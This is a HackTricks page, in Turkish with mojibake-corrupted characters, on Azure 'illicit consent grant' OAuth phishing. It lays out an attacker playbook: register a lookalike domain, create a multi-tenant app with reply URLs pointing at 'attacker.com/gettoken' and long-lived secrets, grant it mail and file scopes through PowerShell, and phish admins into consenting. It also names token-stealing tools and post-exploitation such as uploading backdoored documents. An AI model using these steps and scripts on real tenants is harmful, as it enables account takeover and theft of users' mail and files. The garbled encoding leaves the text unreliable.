# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub depolarÄ±na.

</details>
{% endhint %}

## OAuth App Phishing

**Azure Applications**, **kullanÄ±cÄ± verilerine** (temel bilgiler, belgeler, e-posta gÃ¶nderme...) eriÅŸim izni ister.\
**Ä°zin verilirse**, normal bir kullanÄ±cÄ± yalnÄ±zca **"DÃ¼ÅŸÃ¼k Etki" izinleri** iÃ§in onay verebilir. **DiÄŸer tÃ¼m** durumlarda, **yÃ¶netici onayÄ± gereklidir**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `uygulamalara izin verme izni` iÃ§eren Ã¶zel bir rol, kiracÄ± genelinde onay verebilir.

YalnÄ±zca **yÃ¶netici onayÄ± gerektirmeyen** izinler **dÃ¼ÅŸÃ¼k etki** olarak sÄ±nÄ±flandÄ±rÄ±lÄ±r. Bunlar, **temel oturum aÃ§ma iÃ§in gerekli olan openid, profile, email, User.Read ve offline\_access** izinleridir. Bir **kuruluÅŸ** **tÃ¼m uygulamalar iÃ§in** kullanÄ±cÄ± onayÄ±na **izin veriyorsa**, bir Ã§alÄ±ÅŸan bir uygulamaya **profilinden yukarÄ±dakileri okuma izni** verebilir.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Bu nedenle, bir saldÄ±rgan **kÃ¶tÃ¼ niyetli bir Uygulama** hazÄ±rlayabilir ve bir **phishing** ile kullanÄ±cÄ±yÄ± **UygulamayÄ± kabul etmeye ve verilerini Ã§almaya** zorlayabilir.

### 2 TÃ¼r YasadÄ±ÅŸÄ± Onay Verme SaldÄ±rÄ±sÄ±

* **Kimlik DoÄŸrulamasÄ± Olmayan**: DÄ±ÅŸ bir hesaptan `User.Read` ve `User.ReadBasic.All` izinlerine sahip bir uygulama oluÅŸturun, bir kullanÄ±cÄ±yÄ± phish yapÄ±n ve dizin bilgilerine eriÅŸebilirsiniz.
* Bu, phish yapÄ±lan kullanÄ±cÄ±nÄ±n dÄ±ÅŸ ortamlardan OAuth uygulamalarÄ±nÄ± kabul edebilmesini gerektirir!
* **Kimlik DoÄŸrulamalÄ±**: Yeterli ayrÄ±calÄ±klara sahip bir kullanÄ±cÄ±yÄ± ele geÃ§irerek, hesap iÃ§inde bir uygulama oluÅŸturun ve ayrÄ±calÄ±klÄ± OAuth izinlerini kabul edebilecek ayrÄ±calÄ±klÄ± bir kullanÄ±cÄ±yÄ± phish yapÄ±n.
* Bu durumda zaten dizin bilgilerine eriÅŸebilirsiniz, bu yÃ¼zden `User.ReadBasic.All` izni artÄ±k ilginÃ§ deÄŸildir.
* Muhtemelen **yÃ¶netici onayÄ± gerektiren izinlerle** ilgileniyorsunuz, Ã§Ã¼nkÃ¼ normal kullanÄ±cÄ±lar OAuth uygulamalarÄ±na herhangi bir izin veremez, bu yÃ¼zden yalnÄ±zca **bu kullanÄ±cÄ±larÄ± phish yapmanÄ±z gerekir** (bu ayrÄ±calÄ±ÄŸÄ± hangi rollerin/izinlerin verdiÄŸi hakkÄ±nda daha fazla bilgi daha sonra)

### KullanÄ±cÄ±larÄ±n onay verip veremeyeceÄŸini kontrol edin

AÅŸaÄŸÄ±daki PowerShell komutu, Azure Active Directory (Azure AD) kullanÄ±cÄ±larÄ±nÄ±n uygulamalara onay verme yetenekleriyle ilgili onay yapÄ±landÄ±rmasÄ±nÄ± kontrol etmek iÃ§in kullanÄ±lÄ±r:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Disable user consent**: Bu ayar, kullanÄ±cÄ±larÄ±n uygulamalara izin vermesini yasaklar. HiÃ§bir kullanÄ±cÄ± uygulamalara izin veremez.
* **Users can consent to apps from verified publishers or your organization, but only for permissions you select**: Bu ayar, tÃ¼m kullanÄ±cÄ±larÄ±n yalnÄ±zca doÄŸrulanmÄ±ÅŸ bir yayÄ±ncÄ± tarafÄ±ndan yayÄ±nlanan ve kendi kiracÄ±nÄ±zda kayÄ±tlÄ± uygulamalara izin vermesine olanak tanÄ±r. Belirli izinler iÃ§in izin vererek bir kontrol katmanÄ± ekler.
* **Users can consent to all apps**: Bu ayar daha izin vericidir ve tÃ¼m kullanÄ±cÄ±larÄ±n, yÃ¶netici izni gerektirmeyen izinler iÃ§in herhangi bir uygulamaya izin vermesine olanak tanÄ±r.
* **Custom app consent policy**: Bu ayar, Ã¶zel bir politikanÄ±n yÃ¼rÃ¼rlÃ¼kte olduÄŸunu ve uygulama yayÄ±ncÄ±sÄ±na, uygulamanÄ±n talep ettiÄŸi izinlere ve diÄŸer faktÃ¶rlere dayalÄ± olarak kÄ±sÄ±tlamalarÄ±n bir kombinasyonunu iÃ§erebileceÄŸini belirtir.

## **Illicit Consent Grant Attack Anlama**

Bir illicit consent grant attack'ta, saldÄ±rganlar son kullanÄ±cÄ±larÄ± Azure ile kayÄ±tlÄ± kÃ¶tÃ¼ niyetli bir uygulamaya izin vermeleri iÃ§in kandÄ±rÄ±r. Bu, uygulamayÄ± meÅŸru gÃ¶stererek yapÄ±lÄ±r ve kurbanlarÄ±n farkÄ±nda olmadan "Kabul Et" dÃ¼ÄŸmesine tÄ±klamasÄ±na neden olur. SonuÃ§ olarak, Azure AD saldÄ±rganÄ±n sitesine bir token verir ve bu da saldÄ±rganÄ±n kurbanÄ±n verilerine eriÅŸmesine ve bunlarÄ± manipÃ¼le etmesine olanak tanÄ±r, Ã¶rneÄŸin e-postalarÄ± okuma veya gÃ¶nderme ve dosyalara eriÅŸme gibi, kurumsal bir hesap gerektirmeden.

## **SaldÄ±rÄ± AkÄ±ÅŸÄ±nÄ±n Genel GÃ¶rÃ¼nÃ¼mÃ¼**

SaldÄ±rÄ±, genel bir ÅŸirketi hedef alan birkaÃ§ adÄ±mÄ± iÃ§erir. Ä°ÅŸte nasÄ±l gerÃ§ekleÅŸebileceÄŸi:

1. **Domain Registration and Application Hosting**: SaldÄ±rgan, gÃ¼venilir bir siteye benzeyen bir domain kaydeder, Ã¶rneÄŸin "safedomainlogin.com". Bu domain altÄ±nda, yetkilendirme kodlarÄ±nÄ± yakalamak ve eriÅŸim tokenlarÄ± talep etmek iÃ§in bir uygulama barÄ±ndÄ±rmak Ã¼zere bir alt domain oluÅŸturulur (Ã¶rneÄŸin, "companyname.safedomainlogin.com").
2. **Application Registration in Azure AD**: SaldÄ±rgan, Azure AD Tenant'Ä±nda hedef ÅŸirketin adÄ±nÄ± taÅŸÄ±yan bir Multi-Tenant Application kaydeder ve meÅŸru gÃ¶rÃ¼nmesini saÄŸlar. UygulamanÄ±n YÃ¶nlendirme URL'sini kÃ¶tÃ¼ niyetli uygulamayÄ± barÄ±ndÄ±ran alt domain'e yÃ¶nlendirir.
3. **Setting Up Permissions**: SaldÄ±rgan, uygulamayÄ± Ã§eÅŸitli API izinleriyle (Ã¶rneÄŸin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`) ayarlar. Bu izinler, kullanÄ±cÄ± tarafÄ±ndan verildiÄŸinde, saldÄ±rganÄ±n kullanÄ±cÄ± adÄ±na hassas bilgileri Ã§Ä±karmasÄ±na olanak tanÄ±r.
4. **Distributing Malicious Links**: SaldÄ±rgan, kÃ¶tÃ¼ niyetli uygulamanÄ±n client id'sini iÃ§eren bir baÄŸlantÄ± hazÄ±rlar ve hedeflenen kullanÄ±cÄ±larla paylaÅŸarak onlarÄ± izin vermeleri iÃ§in kandÄ±rÄ±r.

## **SaldÄ±rÄ± Ä°Ã§in AraÃ§larÄ± Kullanma**

SaldÄ±rÄ±, [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) gibi araÃ§lar kullanÄ±larak kolaylaÅŸtÄ±rÄ±labilir.

### SaldÄ±rÄ± Ã–ncesi HazÄ±rlÄ±k:

SaldÄ±rgan, kurban organizasyondaki bir kullanÄ±cÄ±ya bir dÃ¼zeyde eriÅŸime sahipse, organizasyonun politikasÄ±nÄ±n kullanÄ±cÄ±nÄ±n uygulamalarÄ± kabul etmesine izin verip vermediÄŸini kontrol edebilir:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
SaldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rganÄ±n **Azure Tenant'larÄ±nda yeni bir Uygulama** (App registrations iÃ§inde) oluÅŸturmasÄ± ve ÅŸu izinlerle yapÄ±landÄ±rmasÄ± gerekecektir:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`, `Microsoft Graph` iÃ§inde `Delegated permissions` altÄ±ndadÄ±r. (Application permissions her zaman ekstra onay gerektirir).

* `User.ReadBasic.All`, izin verildiÄŸinde organizasyondaki **tÃ¼m kullanÄ±cÄ±larÄ±n bilgilerini okumanÄ±za** olanak tanÄ±yan izindir.
* UnutmayÄ±n ki sadece `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `permission to grant permissions to applications` iÃ§eren Ã¶zel bir rol tenant genelinde onay verebilir. Bu yÃ¼zden, **yÃ¶netici onayÄ± gerektiren bir UygulamayÄ± onaylamasÄ±nÄ±** istiyorsanÄ±z, bu rollerden birine sahip bir kullanÄ±cÄ±yÄ± **phish** etmelisiniz.

AyrÄ±ca cli ile bir Uygulama oluÅŸturabilirsiniz:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) adresine giderek nasÄ±l yapÄ±landÄ±rÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenin.

{% hint style="warning" %}
Elde edilen **eriÅŸim belirteci**nin, **graph endpoint** iÃ§in `User.Read` ve `User.ReadBasic.All` kapsamlarÄ±yla (istenen izinler) olacaÄŸÄ±nÄ± unutmayÄ±n. DiÄŸer iÅŸlemleri gerÃ§ekleÅŸtiremeyeceksiniz (ancak bunlar, organizasyondaki tÃ¼m kullanÄ±cÄ±lar hakkÄ±nda bilgi indirmek iÃ§in yeterlidir).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in bu aracÄ± da kullanabilirsiniz.

## Post-Exploitation

KullanÄ±cÄ±ya eriÅŸim saÄŸladÄ±ktan sonra, hassas belgeleri Ã§almak ve hatta arka kapÄ±lÄ± belge dosyalarÄ± yÃ¼klemek gibi ÅŸeyler yapabilirsiniz.

## Referanslar

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) Ã¼zerinde bizi takip edin.
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
